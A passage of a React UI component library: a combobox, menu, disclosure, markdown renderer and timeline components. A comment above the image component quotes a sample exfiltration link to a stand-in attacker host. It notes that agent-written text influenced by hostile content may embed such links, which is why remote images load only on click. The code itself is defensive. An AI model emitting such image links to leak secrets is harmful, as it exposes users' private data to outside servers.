      e.preventBaseUIHandler();
      onEnter(e.currentTarget.value);
    } else if (whileText && e.key === "Escape" && highlighted.current) {
      // The list stays, but an Escape that drops the highlight is taken, so a form or dialog around closes on the next one.
      e.preventDefault();
    }
  };

  return h(
    "div",
    { className: cx("w-combobox", className) },
    h(
      BaseCombobox.Root,
      {
        items: shown,
        // The text is filtered here, by `filter`.
        filter: null,
        // Nothing is selected in Base UI's terms: a pick goes to `onPick`, and `value` is the field's text.
        value: null,
        onValueChange: (option) => {
          if (!option) return;
          onPick(option);
          close();
        },
        inputValue: freeText || !open ? value : query,
        onInputValueChange: (next, details) => {
          if (details.reason !== "input-change") return;
          if (freeText) onInput?.(next);
          else setQuery(next);
        },
        open: visible && !letGo,
        onOpenChange: (next, details) => {
          if (whileText) {
            // Escape, Tab and a press outside: the list stays, and it's left to the page when nothing was highlighted.
            details.cancel();
            if (!next) dismiss();
            return;
          }
          if (next && !freeText && details.reason !== "input-change") setQuery("");
          if (next) setOpened(true);
          else close();
        },
        onItemHighlighted: (option) => (highlighted.current = option !== undefined),
        itemToStringLabel: (option) => option.label,
        autoHighlight: freeText ? false : "always",
      },
      h(BaseCombobox.Input, {
        "aria-label": label,
        ...rest,
        id,
        ref: input,
        className: "w-input",
        spellCheck: false,
        onFocus: (e) => {
          if (!freeText) e.currentTarget.select();
          if (!openOnFocus || whileText) return;
          if (!freeText) setQuery("");
          setOpened(true);
        },
        onKeyDown,
      }),
      h(
        BaseCombobox.Portal,
        null,
        h(
          BaseCombobox.Positioner,
          { className: "w-positioner", sideOffset: 4 },
          h(
            BaseCombobox.Popup,
            { className: "w-popup w-combobox-popup", "aria-label": label },
            h(BaseCombobox.Empty, { className: "w-option-empty" }, empty),
            h(
              BaseCombobox.List,
              null,
              (o) =>
                h(BaseCombobox.Item, { key: o.value, value: o, className: "w-option" }, h("span", { className: "w-option-label" }, o.label), o.detail ? h("span", { className: "w-option-detail" }, o.detail) : null),
            ),
          ),
        ),
      ),
    ),
  );
}

/**
 * A button that opens a menu of `items` under it on Base UI's Menu, each `{ id, label, onSelect, variant? }`. Arrows,
 * Home and End move, Enter or Space picks, Escape closes and puts focus back on the button. `align` end lines it up
 * on the right.
 */
export function Menu({ label, items, align, variant = "default", size = "default", className, ...rest }) {
  return h(
    "div",
    { className: cx("w-menu-root", className) },
    h(
      BaseMenu.Root,
      null,
      h(BaseMenu.Trigger, { ...rest, className: "w-button", "data-variant": variant, "data-size": size }, label),
      h(
        BaseMenu.Portal,
        null,
        h(
          BaseMenu.Positioner,
          { className: "w-positioner", align: align === "end" ? "end" : "start", sideOffset: 4 },
          h(
            BaseMenu.Popup,
            { className: "w-popup w-menu-popup" },
            items.map((item) => h(BaseMenu.Item, { key: item.id, className: "w-menu-item", "data-variant": item.variant ?? "default", onClick: item.onSelect }, item.label)),
          ),
        ),
      ),
    ),
  );
}

/** More behind a `summary` line that opens it, on Base UI's Collapsible. */
export function Disclosure({ summary, open, defaultOpen, onOpenChange, children, className, ...rest }) {
  return h(
    BaseCollapsible.Root,
    { ...rest, className: cx("w-disclosure", className), open, defaultOpen, onOpenChange: onOpenChange && ((next) => onOpenChange(next)) },
    h(BaseCollapsible.Trigger, { className: "w-disclosure-trigger" }, summary),
    h(BaseCollapsible.Panel, { className: "w-disclosure-panel" }, children),
  );
}

// ---------- markdown ----------

const openLink = (e, href) => {
  e.preventDefault();
  // Needs `permissions.openUrl` in the manifest, like `["https://"]`.
  wings.openUrl(href).catch(console.error);
};

/** Parsed inline spans by text, so a render doesn't parse every cell and paragraph again. */
const inlines = new Map();
function inlineOf(text) {
  let parts = inlines.get(text);
  if (!parts) {
    parts = parseInline(text);
    if (inlines.size >= 500) inlines.delete(inlines.keys().next().value);
    inlines.set(text, parts);
  }
  return parts;
}

/**
 * A remote image is a button until it's clicked: loading an image tells its server who looked and when, and the text
 * may come from an agent that read something hostile (`![](https://attacker.example/?d=secret)`). A data: image
 * carries its own bytes, so it shows at once.
 */
function MdImage({ src, alt }) {
  const [loaded, setLoaded] = useState(false);
  const img = (h("img", { className: "w-md-image", src, alt, loading: "lazy", decoding: "async", referrerPolicy: "no-referrer" }));
  if (src.startsWith("data:") || loaded) return img;
  const host = new URL(src).host;
  return h("button", { type: "button", className: "w-md-image-load", title: alt || undefined, onClick: () => setLoaded(true) }, `Load image from ${host}`);
}

function MdInline({ text }) {
  return inlineOf(text).map((part, i) => {
    switch (part.kind) {
      case "code":
        return h("code", { key: i, className: "w-md-code" }, part.text);
      case "strong":
        return h("strong", { key: i }, emojify(part.text));
      case "em":
        return h("em", { key: i }, emojify(part.text));
      case "del":
        return h("del", { key: i }, emojify(part.text));
      case "image":
        return h(MdImage, { key: i, src: part.src, alt: part.alt });
      case "link":
        return h("a", { key: i, className: "w-md-link", href: part.href, onClick: (e) => openLink(e, part.href) }, emojify(part.text));
      default:
        return part.text;
    }
  });
}

/** Parsed blocks by source, so a page that renders many sections only parses the one that changed. */
const parsed = new Map();
function blocksOf(source) {
  let blocks = parsed.get(source);
  if (!blocks) {
    blocks = parseBlocks(source);
    if (parsed.size >= 200) parsed.delete(parsed.keys().next().value);
    parsed.set(source, blocks);
  }
  return blocks;
}

/**
 * Markdown as React elements. No HTML is ever parsed; links open through `wings.openUrl` and only when they are
 * https; images show only from https or small data:image URLs, and an https image loads only when clicked. Re-renders only when `source` changes.
 */
export const Markdown = memo(function Markdown({ source, inline, className, ...rest }) {
  if (inline) return h("span", { ...rest, className: cx("w-md", className) }, h(MdInline, { text: source }));
  return h("div", { ...rest, className: cx("w-md", className) }, mdBlocks(blocksOf(source)));
});

function mdBlocks(blocks) {
  return blocks.map((b, i) => {
      switch (b.kind) {
        case "details":
          return h(
            "details",
            { key: i, className: "w-md-details" },
            h("summary", { className: "w-md-summary" }, h(MdInline, { text: b.summary })),
            h("div", { className: "w-md w-md-details-body" }, mdBlocks(b.blocks)),
          );
        case "heading":
          return h(`h${Math.min(b.level + 2, 6)}`, { key: i, className: "w-md-heading", "data-level": Math.min(b.level, 4) }, h(MdInline, { text: b.text }));
        case "list":
          return h(
            b.ordered ? "ol" : "ul",
            { key: i, className: "w-md-list", "data-ordered": b.ordered ? "" : undefined },
            b.items.map((item, j) =>
              h(
                "li",
                { key: j, "data-depth": item.depth || undefined, "data-task": item.checked === null ? undefined : "" },
                item.checked === null ? null : h("input", { type: "checkbox", checked: item.checked, disabled: true, "aria-label": item.checked ? "Done" : "Not done", className: "w-md-check" }),
                h(MdInline, { text: item.text }),
              ),
            ),
          );
        case "code":
          return h("pre", { key: i, className: "w-md-pre" }, h("code", null, b.text));
        case "quote":
          return h("blockquote", { key: i, className: "w-md-quote" }, h(MdInline, { text: b.text }));
        case "rule":
          return h("hr", { key: i, className: "w-md-rule" });
        case "table":
          return h(
            "div",
            { key: i, className: "w-md-table-wrap" },
            h(
              "table",
              { className: "w-md-table" },
              h("thead", null, h("tr", null, b.head.map((c, j) => h("th", { key: j, scope: "col", "data-align": b.align[j] ?? undefined }, h(MdInline, { text: c }))))),
              h("tbody", null, b.rows.map((row, r) => h("tr", { key: r }, row.map((c, j) => h("td", { key: j, "data-align": b.align[j] ?? undefined }, h(MdInline, { text: c })))))),
            ),
          );
        default:
          return h("p", { key: i }, h(MdInline, { text: b.text }));
      }
  });
}

// ---------- activity: times, a summary row, skeletons and a timeline ----------

export { ago };

/** A moment as a `time` element: how long ago, with the exact date and time on hover. Nothing when `iso` isn't a date. */
export function Time({ iso, prefix, now, className, ...rest }) {
  const text = ago(iso, now);
  if (!text) return null;
  return h("time", { title: new Date(iso).toLocaleString(), ...rest, className, dateTime: iso }, prefix, text);
}

/** A row of `SummaryChip`s under a page's header: the facts about the thing at a glance. */
export function Summary({ className, ...rest }) {
  return h("div", { ...rest, className: cx("w-summary", className) });
}

/** One fact in a `Summary`. With `onClick` it's a button (it takes you to where the fact comes from); without, plain text. */
export function SummaryChip({ tone, className, onClick, type = "button", ...rest }) {
  const props = { ...rest, className: cx("w-summary-chip", className), "data-tone": tone };
  return onClick ? h("button", { ...props, type, onClick }) : h("span", props);
}

/** A grey block that stands in for content that is still loading, sized by `width` and `height` (CSS lengths or px). It shimmers unless the user asked for less motion. */
export function Skeleton({ width, height, className, style, ...rest }) {
  const size = (v) => (typeof v === "number" ? `${v}px` : v);
  return h("span", {
    ...rest,
    className: cx("w-skeleton", className),
    style: { ...style, ...(width === undefined ? null : { "--w-width": size(width) }), ...(height === undefined ? null : { "--w-height": size(height) }) },
    "aria-hidden": true,
  });
}

/** Skeletons that stand in for a section, announced once as `label` and `aria-busy`. */
export function Skeletons({ label, children, className, ...rest }) {
  // The label is text inside the region, which a live region announces; an aria-label alone isn't.
  return h("div", { ...rest, className: cx("w-skeletons", className), role: "status", "aria-busy": true }, h("span", { className: "w-visually-hidden" }, label), children);
}

/** A conversation or an activity feed: an ordered list of `TimelineCard`s and `TimelineNote`s. */
export function Timeline({ label, className, ...rest }) {
  return h("ol", { ...rest, className: cx("w-timeline", className), "aria-label": label });
}

const FOCUSABLE = "a[href], button, input, select, textarea, summary, [tabindex]";

/** Cuts `children` after a few lines until the reader asks for the rest; focusable things below the cut are inert meanwhile. The button only shows when something was cut. */
function Clamped({ children }) {
  const box = useRef(null);
  const [more, setMore] = useState(false);
  const [cut, setCut] = useState(false);
  useLayoutEffect(() => {
    const el = box.current;
    if (!el) return;
    if (more) {
      for (const f of el.querySelectorAll(FOCUSABLE)) f.inert = false;
      return;
    }
    const measure = () => {
      setCut(el.scrollHeight > el.clientHeight + 1);
      // What the cut hides can't be reached by keyboard or screen reader until "Show more".
      const bottom = el.getBoundingClientRect().bottom;
      for (const f of el.querySelectorAll(FOCUSABLE)) f.inert = f.getBoundingClientRect().top >= bottom - 1;
    };
    measure();
    if (typeof ResizeObserver === "undefined") return;
    const watch = new ResizeObserver(measure);
    watch.observe(el);
    return () => watch.disconnect();
  }, [more]);
  return h(
    "div",
    { className: "w-clamp" },
    h("div", { ref: box, className: "w-clamp-box", "data-clamped": more ? undefined : "", "data-cut": cut && !more ? "" : undefined }, children),
    cut || more ? h("button", { type: "button", className: "w-clamp-toggle", "aria-expanded": more, onClick: () => setMore(!more) }, more ? "Show less" : "Show more") : null,
  );
}

/**
 * One entry of a `Timeline`, a card: the author's `Avatar`, name and when, a `tag` (like "Author") and `actions` on the
 * right, and `children` as the body. `quiet` draws it without a fill, for what a bot or the system wrote. `clamp` cuts
 * a long body until "Show more" is pressed.
 */
export function TimelineCard({ author, at, tag, actions, quiet, clamp, children, className, ...rest }) {
  return h(
    "li",
    { ...rest, className: cx("w-timeline-item", className), "data-quiet": quiet ? "" : undefined },
    h(
      "article",
      { className: "w-timeline-card", "aria-label": `By ${author}` },
      h(
        "div",
        { className: "w-timeline-head" },
        h(Avatar, { name: author }),
        h("strong", { className: "w-timeline-author" }, author),
        tag ? h("span", { className: "w-timeline-tag" }, tag) : null,
        h(Time, { iso: at, className: "w-timeline-time" }),
        actions ? h("span", { className: "w-timeline-actions" }, actions) : null,
      ),
      clamp ? h(Clamped, null, children) : children,
    ),
  );
}

/** A quiet one-line entry of a `Timeline`, like "Ada moved it to Active": a small avatar, then `children`, then when. */
export function TimelineNote({ author, at, children, className, ...rest }) {
  return h(
    "li",
    { ...rest, className: cx("w-timeline-item w-timeline-note", className) },
    h(Avatar, { name: author, size: "small" }),
    h("span", { className: "w-timeline-note-text" }, h("strong", null, author), " ", children),
    h(Time, { iso: at, className: "w-timeline-time" }),
  );
}
